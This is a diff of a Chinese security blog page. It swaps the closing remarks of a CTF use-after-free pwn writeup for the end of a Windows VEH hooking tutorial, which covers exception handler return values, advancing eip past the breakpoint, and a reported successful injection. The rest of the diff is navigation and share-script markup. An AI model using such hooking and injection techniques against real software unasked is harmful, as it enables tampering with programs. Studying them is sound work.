-<h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>本题目来源于zjctf2020决赛的pwn2，据说那题也没多少人做出来，而我虽然能自己独立做出来，但是整整花了9个小时，听说去年决赛总共也就8个小时qwq。</p>
-<p>这真的是我做过的最难的uaf漏洞的题目了，我原本以为它应该就跟那种没有任何特殊字符过滤的sql注入差不多，没想到它到处加限制导致很多漏洞很难利用，也算是给我展示了一波吧，希望这次的省赛能让我出一道pwn吧，加油冲冲冲！</p>
+<p>在这里</p>
+<ul>
+<li>EXCEPTION_EXECUTE_HANDLER(1)：表示该异常被处理，从异常处下一条指令继续执行</li>
+<li>EXCEPTION_CONTINUE_SEARCH(0)：表示异常不能被处理，交给下一个SEH</li>
+<li>EXCEPTION_CONTINUE_EXECUTION(-1)：表示异常被忽略，从异常处继续执行</li>
+</ul>
+<p>这里还有一点需要注意一下，就是 程序的指令指针 eip 需要后移两个字节，不然它会一直循环被自己断住的。</p>
+<p>运行程序，注入，成功！</p>
+<p><img src="/2022/10/07/Hook5-VEH%20hook/1.png"></p>
 
       
     </div>
@@ -305,13 +277,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/">2020浙江省赛 pwn2 writeup</a></p>
+        <p><span>本文标题:</span><a href="/2022/10/07/Hook5-VEH%20hook/">Hook专题4-hotfix hook</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">xia0ji233</a></p>
-        <p><span>发布时间:</span>2021-10-26, 10:00:00</p>
-        <p><span>最后更新:</span>2022-04-18, 14:51:22</p>
+        <p><span>发布时间:</span>2022-10-07, 18:00:00</p>
+        <p><span>最后更新:</span>2022-10-07, 19:49:08</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/" title="2020浙江省赛 pwn2 writeup">http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/　　作者: xia0ji233" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2022/10/07/Hook5-VEH%20hook/" title="Hook专题4-hotfix hook">http://example.com/2022/10/07/Hook5-VEH%20hook/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2022/10/07/Hook5-VEH%20hook/　　作者: xia0ji233" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -323,16 +295,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/">
-                    2021江西省赛RSA writeup
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/10/26/gyctf_2020_document/">
-                    gyctf_2020_document write up
+                <a href="/2022/10/06/Hook4-Hotfix%20hook/">
+                    Hook专题4-hotfix hook
                 </a>
             </div>
         
@@ -344,7 +310,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">2.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81"><span class="toc-number">3.</span> <span class="toc-text">劫持程序流</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E8%AF%9D"><span class="toc-number">4.</span> <span class="toc-text">最后的话</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E8%8A%9D%E5%A3%AB"><span class="toc-number">1.1.</span> <span class="toc-text">前置芝士</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SEH"><span class="toc-number">1.1.1.</span> <span class="toc-text">SEH</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VEH"><span class="toc-number">1.1.2.</span> <span class="toc-text">VEH</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VEH-hook"><span class="toc-number">1.2.</span> <span class="toc-text">VEH hook</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -380,7 +346,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"2020浙江省赛 pwn2 writeup　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Hook专题4-hotfix hook　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -400,15 +366,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/" title="上一篇: 2021江西省赛RSA writeup">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/10/26/gyctf_2020_document/" title="下一篇: gyctf_2020_document write up">
+            <a href="/2022/10/06/Hook4-Hotfix%20hook/" title="下一篇: Hook专题4-hotfix hook">
                 <i class="fa fa-angle-right"></i>
             </a>
         
